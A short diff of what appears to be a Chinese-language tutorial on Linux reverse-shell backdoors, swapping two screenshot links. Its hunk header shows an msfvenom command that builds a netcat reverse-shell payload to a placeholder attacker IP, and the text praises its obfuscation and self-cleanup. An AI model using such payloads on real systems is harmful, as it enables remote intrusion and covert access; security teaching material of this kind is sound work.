@@ -305,11 +305,11 @@ msfvenom -p cmd/unix/reverse_netcat lhost=[ATTACKER-IP] lport=10000 R
 
 靶机截图：
 
-![]({{ site.url }}/images/linux-backdoor/bash-reverse-18.png)
+![]({{ site.url }}/images/linux-backdoor/bash-reverse-19.png)
 
 攻击者截图：
 
-![]({{ site.url }}/images/linux-backdoor/bash-reverse-19.png)
+![]({{ site.url }}/images/linux-backdoor/bash-reverse-18.png)
 
 可以看到，`msfvenom`生成的反弹shell代码经过了不同程度的混淆，也更完善更隐蔽，会在反弹的shell进程结束后自行清理文件痕迹。
 
